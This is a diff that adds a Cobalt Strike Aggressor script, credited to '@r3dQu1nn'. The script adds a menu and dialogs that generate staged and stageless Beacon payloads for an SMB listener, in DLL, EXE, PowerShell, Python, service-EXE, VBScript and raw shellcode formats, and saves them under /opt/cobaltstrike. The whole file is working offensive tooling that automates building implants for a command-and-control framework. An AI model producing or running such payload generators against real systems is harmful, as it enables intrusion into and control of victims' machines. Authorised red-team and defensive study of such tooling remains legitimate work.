@@ -1,0 +1,212 @@
+#SMB Artifact Payload Generator
+#Author: @r3dQu1nn
+#Generates any type of Stageless/Staged Payload based off a SMB Listener
+
+#Custom Directory for Payloads
+mkdir("/opt/cobaltstrike/SMB_Staged_Payloads");
+mkdir("/opt/cobaltstrike/SMB_Stageless_Payloads");
+
+menubar("SMB Payload Generator", "payloadgenerator", 2);
+popup payloadgenerator {
+	menu "&SMB Payload Generator" {
+		item "&SMB Staged Payloads" {
+			payloadgeneratestaged();
+		}
+		item "&SMB Stageless Payloads" {
+			payloadgeneratestageless();
+		}
+	}
+}
+
+sub payloadgeneratestaged {
+
+	$dialog = dialog("SMB Payload Generator", %(listener => "Listener: ", payload_type => "Payload Type: ", Output => "Output: "), &Staged_Output);
+	dialog_description($dialog, "Generates a Staged or Stageless SMB Payload based on the selected SMB listener. **Payloads will be stored in /opt/cobaltstrike/SMB_Staged_Payloads**");
+	drow_listener_smb($dialog, "listener", "Listener: ");
+    	drow_text($dialog, "Name", "Payload Name: ");
+    	drow_combobox($dialog, "payload_type", "Payload Type: ", @("Staged"));
+    	drow_combobox($dialog, "Output", "Output: ", @("dll", "dllx64", "exe", "powershell", "python", "svcexe", "vbscript"));
+    	dbutton_action($dialog, "Generate");
+    	dialog_show($dialog);
+    
+}
+
+sub payloadgeneratestageless {
+
+	$dialog = dialog("SMB Payload Generator", %(listener => "Listener: ", payload_type => "Payload Type: ", Output => "Output: "), &Stageless_Output);
+	dialog_description($dialog, "Generates a Staged or Stageless SMB Payload based on the selected SMB listener. **Payloads will be stored in /opt/cobaltstrike/SMB_Stageless_Payloads**");
+    	drow_listener_smb($dialog, "listener", "Listener: ");
+    	drow_text($dialog, "Name", "Payload Name: ");
+    	drow_combobox($dialog, "payload_type", "Payload Type: ", @("Stageless"));
+    	drow_combobox($dialog, "Output", "Output: ", @("dll", "dllx64", "exe", "powershell", "svcexe", "raw"));
+    	dbutton_action($dialog, "Generate");
+    	dialog_show($dialog);
+    
+}
+
+sub Staged_Output {
+
+	#Error Check
+	if ($3['Name'] ismatch "") {
+		berror($1, 'You did not select a proper SMB Listener or Input a Payload Name!');
+		show_message("Please select a proper SMB Listener and Input a Payload Name!");
+	}
+	#Staged Payloads
+	else if ($3['Output'] eq 'dll') {
+		$data = artifact($3['listener'], "dll");
+		$handle = openf(">/opt/cobaltstrike/SMB_Staged_Payloads/". $3['Name'] .".dll");
+		writeb($handle, $data);
+		closef($handle);
+		show_message("Saved SMB DLL at /opt/cobaltstrike/SMB_Staged_Payloads/". $3['Name'] .".dll");
+		clear($3);
+	}
+	else if ($3['Output'] eq 'dllx64') {
+		$data = artifact($3['listener'], "dllx64");
+		$handle = openf(">/opt/cobaltstrike/SMB_Staged_Payloads/". $3['Name'] .".dll");
+		writeb($handle, $data);
+		closef($handle);
+		show_message("Saved 64 bit SMB DLL at /opt/cobaltstrike/SMB_Staged_Payloads/". $3['Name'] .".dll");
+		clear($3);
+	}
+	else if ($3['Output'] eq 'exe') {
+		$data = artifact($3['listener'], "exe");
+		$handle = openf(">/opt/cobaltstrike/SMB_Staged_Payloads/". $3['Name'] .".exe");
+		writeb($handle, $data);
+		closef($handle);
+		show_message("Saved EXE at /opt/cobaltstrike/SMB_Staged_Payloads/". $3['Name'] .".exe");
+		clear($3);
+	}
+	else if ($3['Output'] eq 'powershell') {
+		$data = artifact($3['listener'], "powershell");
+		$handle = openf(">/opt/cobaltstrike/SMB_Staged_Payloads/". $3['Name'] ."");
+		writeb($handle, $data);
+		closef($handle);
+		show_message("Saved Powershell SMB Payload at /opt/cobaltstrike/SMB_Staged_Payloads/". $3['Name'] ."");
+		clear($3);
+	}
+	else if ($3['payload_type'] eq 'Staged' && $3['Output'] eq 'python') {
+		$data = artifact($3['listener'], "python");
+		$handle = openf(">/opt/cobaltstrike/SMB_Staged_Payloads/". $3['Name'] .".py");
+		writeb($handle, $data);
+		closef($handle);
+		show_message("Saved Python SMB Payload at /opt/cobaltstrike/SMB_Staged_Payloads/". $3['Name'] .".py");
+		clear($3);
+	}
+	else if ($3['payload_type'] eq 'Staged' && $3['Output'] eq 'svcexe') {
+		$data = artifact($3['listener'], "svcexe");
+		$handle = openf(">/opt/cobaltstrike/SMB_Staged_Payloads/". $3['Name'] .".exe");
+		writeb($handle, $data);
+		closef($handle);
+		show_message("Saved SVCEXE at /opt/cobaltstrike/SMB_Staged_Payloads/". $3['Name'] .".exe");
+		clear($3);
+	}
+	else if ($3['payload_type'] eq 'Staged' && $3['Output'] eq 'vbscript') {
+		$data = artifact($3['listener'], "vbscript");
+		$handle = openf(">/opt/cobaltstrike/SMB_Staged_Payloads/". $3['Name'] .".vbs");
+		writeb($handle, $data);
+		closef($handle);
+		show_message("Saved vbscript SMB Payload at /opt/cobaltstrike/SMB_Staged_Payloads/". $3['Name'] .".vbs");
+		clear($3);
+	}	
+	
+}
+
+sub Stageless_Output {
+	
+	if ($3['Name'] ismatch "") {
+		berror($1, 'You did not select a proper SMB Listener or Input a Payload Name!');
+		show_message("Please select a proper SMB Listener and Input a Payload Name!");
+	}
+	#Stageless Payloads
+	else if ($3['Output'] eq 'dll') {
+		artifact_stageless($3['listener'], "dll", "x86", "", &dll);
+		$Name = "".$3['Name']."";
+	}
+	else if ($3['Output'] eq 'dllx64') {
+		artifact_stageless($3['listener'], "dllx64", "x86", "", &dllx64);
+		$Name = "".$3['Name']."";
+	}
+	else if ($3['Output'] eq 'exe') {
+		artifact_stageless($3['listener'], "exe", "x86", "", &exe);
+		$Name = "".$3['Name']."";
+	}
+	else if ($3['Output'] eq 'powershell') {
+		artifact_stageless($3['listener'], "powershell", "x86", "", &ps1);
+		$Name = "".$3['Name']."";
+	}
+	else if ($3['Output'] eq 'raw') {
+		artifact_stageless($3['listener'], "raw", "x86", "", &raw);
+		$Name = "".$3['Name']."";
+	}
+	else if ($3['Output'] eq 'svcexe') {
+		artifact_stageless($3['listener'], "svcexe", "x86", "", &svcexe);
+		$Name = "".$3['Name']."";
+	}
+}
+
+#Sub Functions for Stageless Artifacts
+sub dll {
+
+	#Write and Save Payload
+	local('$cradle');
+	$cradle = openf(">/opt/cobaltstrike/SMB_Stageless_Payloads/". $Name .".dll");
+	writeb($cradle, $1);
+	closef($cradle);
+	show_message("Saved SMB DLL at /opt/cobaltstrike/SMB_Stageless_Payloads/". $Name .".dll");
+
+}
+
+sub dllx64 {
+
+	#Write and Save Payload
+	local('$cradle1');
+	$cradle1 = openf(">/opt/cobaltstrike/SMB_Stageless_Payloads/". $Name .".dll");
+	writeb($cradle1, $1);
+	closef($cradle1);
+	show_message("Saved 64 bit SMB DLL at /opt/cobaltstrike/SMB_Stageless_Payloads/". $Name .".dll");
+
+}
+
+sub exe {
+
+	#Write and Save Payload
+	local('$cradle2');
+	$cradle2 = openf(">/opt/cobaltstrike/SMB_Stageless_Payloads/". $Name .".exe");
+	writeb($cradle2, $1);
+	closef($cradle2);
+	show_message("Saved EXE at /opt/cobaltstrike/SMB_Stageless_Payloads/". $Name .".exe");
+
+}
+
+sub ps1 {
+
+	#Write and Save Payload
+	local('$cradle3');
+	$cradle3 = openf(">/opt/cobaltstrike/SMB_Stageless_Payloads/". $Name ."");
+	writeb($cradle3, $1);
+	closef($cradle3);
+	show_message("Saved Powershell SMB Payload at /opt/cobaltstrike/SMB_Stageless_Payloads/". $Name ."");
+
+}
+
+sub raw {
+
+	#Write and Save Payload
+	local('$cradle4');
+	$cradle4 = openf(">/opt/cobaltstrike/SMB_Stageless_Payloads/". $Name .".bin");
+	writeb($cradle4, $1);
+	closef($cradle4);
+	show_message("Saved Raw SMB Payload at /opt/cobaltstrike/SMB_Stageless_Payloads/". $Name .".bin");
+
+}
+
+sub svcexe {
+
+	#Write and Save Payload
+	local('$cradle5');
+	$cradle5 = openf(">/opt/cobaltstrike/SMB_Stageless_Payloads/". $Name .".exe");
+	writeb($cradle5, $1);
+	closef($cradle5);
+	show_message("Saved EXE at /opt/cobaltstrike/SMB_Stageless_Payloads/". $Name .".exe");
+
+}
